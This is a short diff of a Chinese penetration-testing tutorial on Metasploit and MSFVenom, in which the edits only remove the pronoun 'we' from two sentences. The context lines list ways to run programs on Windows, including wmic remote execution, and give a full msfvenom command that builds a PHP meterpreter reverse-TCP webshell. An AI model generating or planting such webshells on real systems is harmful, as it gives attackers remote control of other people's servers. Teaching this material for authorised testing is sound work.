@@ -62,7 +62,7 @@ exploit -j -z
 
 -----
  
-在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：
+在这里既然使用到了在Windows下执行应用程序，就大概盘点一下在Windows执行应用程序的几种方式：
 
 双击运行
 cmd下运行exe
@@ -71,7 +71,7 @@ cmd下运行exe
 利用wmic远程命令执行
 其他的方式请各位补充
 生成webshell脚本
-在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，如何使用MSFVenom生成一个可以用msf操作的webshell呢？
+在做web渗透的时候，经常会用到webshell，经常用的一句话用菜刀连接，如何使用MSFVenom生成一个可以用msf操作的webshell呢？
 
 - PHP
 `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
